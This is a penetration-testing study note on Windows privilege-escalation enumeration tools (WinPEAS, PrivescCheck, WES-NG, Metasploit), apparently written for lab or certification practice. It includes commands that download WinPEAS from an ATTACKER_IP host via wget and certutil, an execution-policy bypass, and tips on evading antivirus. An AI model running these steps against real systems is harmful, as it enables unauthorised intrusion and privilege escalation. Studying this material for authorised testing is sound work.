---
title: "Windows Automated Enumeration Tools"
created: 2026-11-16
type: tool
tags: [enumeration, windows, privesc, tool]
---

Automated tools for Windows privilege escalation enumeration. Same principle as Linux — they speed up Phase 2 but don't replace understanding. No single tool catches everything.

---

## Tool Comparison

| Tool | Type | Runs On | What It Does |
|------|------|---------|-------------|
| **WinPEAS** | Binary (.exe) | Target | Comprehensive enumeration — misconfigs, weak perms, credentials, CVEs. Color-coded output |
| **PrivescCheck** | PowerShell script | Target | Similar coverage to WinPEAS without needing a binary. Good when executables are flagged by AV |
| **WES-NG** | Python script | Attacker | Compares `systeminfo` output against a CVE database. Runs on your machine — nothing touches the target |
| **PowerUp** | PowerShell (PowerSploit) | Target | Focused on service misconfigurations, unquoted paths, and DLL hijacking |

---

## WinPEAS

The most comprehensive option. Highlights findings by severity using colors.

```
winpeas.exe > output.txt
```

Always redirect to a file — the output is massive and scrolls past quickly. Review it after.

**AV warning:** WinPEAS is well-known and frequently flagged by antivirus. If it gets deleted on upload, try PrivescCheck instead.

### Getting it on target

```powershell
# From PowerShell on target
wget http://ATTACKER_IP:8000/winpeas.exe -O winpeas.exe

# Or via certutil
certutil -urlcache -f http://ATTACKER_IP:8000/winpeas.exe winpeas.exe
```

---

## PrivescCheck

PowerShell-based alternative — no binary to flag. Requires bypassing execution policy.

```powershell
Set-ExecutionPolicy Bypass -Scope process -Force
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```

Good for environments where dropping `.exe` files triggers alerts.

---

## WES-NG (Windows Exploit Suggester - Next Generation)

Runs entirely on your attacker machine. Needs only `systeminfo` output from the target.

```bash
# Update the database first
wes.py --update

# On target: save systeminfo to a file
systeminfo > systeminfo.txt

# Transfer systeminfo.txt to attacker, then:
wes.py systeminfo.txt
```

Compares installed patches against known CVEs. Useful for identifying missing patches without running anything suspicious on the target.

---

## Metasploit

If you already have a Meterpreter session:

```
use multi/recon/local_exploit_suggester
set SESSION <session_id>
run
```

Checks for applicable local privilege escalation modules based on the target system.

---

## Workflow

1. **WinPEAS or PrivescCheck** — run on target for broad enumeration
2. **WES-NG** — run on attacker machine for patch-based CVE matching
3. **Manual verification** — confirm findings, check permissions, test exploitability
4. **Metasploit** — if you have a Meterpreter session, use the local exploit suggester as a complement

---

## Related Notes

- [[Automated Enumeration Tools]] — Linux equivalents (LinPEAS, LinEnum, LES)
- [[Abusing Vulnerable Software]] — exploiting what the tools find
- [[Methodology]] — where automated tools fit in the privesc workflow
